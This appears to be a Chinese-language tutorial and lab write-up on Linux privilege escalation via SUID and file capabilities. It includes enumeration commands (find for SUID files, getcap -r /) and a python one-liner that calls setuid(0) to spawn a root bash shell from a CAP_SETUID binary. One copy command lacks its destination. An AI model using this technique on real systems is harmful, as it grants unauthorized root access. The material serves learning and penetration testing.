# 使用功能的Linux特权升级

## 0x01 SUID
能力介绍
Linux中的功能是什么

在获得功能之前，我们只有特权和非特权进程的二进制系统，并且出于执行权限检查的目的，传统的UNIX实现将进程分为两类：特权进程（称为超级用户或根）和非特权进程（其有效UID为非零）。

功能是将内核用户或内核级程序的特权分成小块的那些权限，以便可以使进程有足够的能力执行特定的特权任务。

功能和SUID之间的区别

SUID： SUID代表设置的用户ID，并允许用户以文件所有者的身份执行文件。这被定义为授予用户临时权限，使其在文件所有者（而不是运行文件所有者）的权限下运行程序/文件。使用“查找”命令可以很容易地检测到。要查找在当前目录中设置了SUID的所有文件，我们可以使用-perm选项，该选项将仅打印许可权设置为4000的文件（允许进程临时使用root的权限执行）

给予某个文件拥有临时权限的命令
例子：
```
chmod u+s /usr/bin/python
```

使用find命令可以找出SUID文件
```
find / -perm -u=s -type f 2>/dev/null
```
![Qmmes0.png](https://s2.ax1x.com/2019/12/01/Qmmes0.png)

## 0x02 牛刀小试
setcap详解：[setcap详解 - 农夫运维 - 博客园](https://www.cnblogs.com/nf01/articles/10418141.html)
setcap简要说明：
```
 Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而CAP_SETUID表示用户能够修改进程用户身份的特权操作。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制。
```

getcap：检索setcap所设置的文件
```
getcap -r  / 2>/dev/null
```
![QmnH9H.png](https://s2.ax1x.com/2019/12/01/QmnH9H.png)

## 0x03实验
```
OS：kali
测试用户：root、test
```
先用root用户给予python SUID
```
chmod u+s /usr/bin/python
```

查找一波对应的SUID权限的文件,确定是否给予成功
```
find / -perm -u=s -type f 2>/dev/null
```
![Qm1t9U.png](https://s2.ax1x.com/2019/12/01/Qm1t9U.png)

复制python到/tmp目录下，拟态和文章类似的构造
```
cp /usr/bin/python
```
![Qm3OJK.png](https://s2.ax1x.com/2019/12/01/Qm3OJK.png)

setcap给予tmp目录下的python一个用户临时执行权限
```
setcap CAP_SETUID+ep /tmp/python
```
![Qm8ues.png](https://s2.ax1x.com/2019/12/01/Qm8ues.png)

切换至test用户，执行以下命令即可获取一个root权限
```
getcap -r / 2>/dev/null #查询被赋予权限的文件
```
![Qm8sSO.png](https://s2.ax1x.com/2019/12/01/Qm8sSO.png)

```
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
```
![Qm8hkt.png](https://s2.ax1x.com/2019/12/01/Qm8hkt.png)

## 0x04结论
getcap -r / 2>/dev/null #查询被赋予CAP_SETUID权限的文件，来获取某些文件是否有利用的价值。目前得出可以利用用的几个
```
perl
python
tar
```

## 0x05参考链接
[Hacking Articles - Raj Chandel's Blog](https://www.hackingarticles.in/)
[getcap(8) - Linux manual page](http://man7.org/linux/man-pages/man8/getcap.8.html)
[setcap详解 - 农夫运维 - 博客园](https://www.cnblogs.com/nf01/articles/10418141.html)  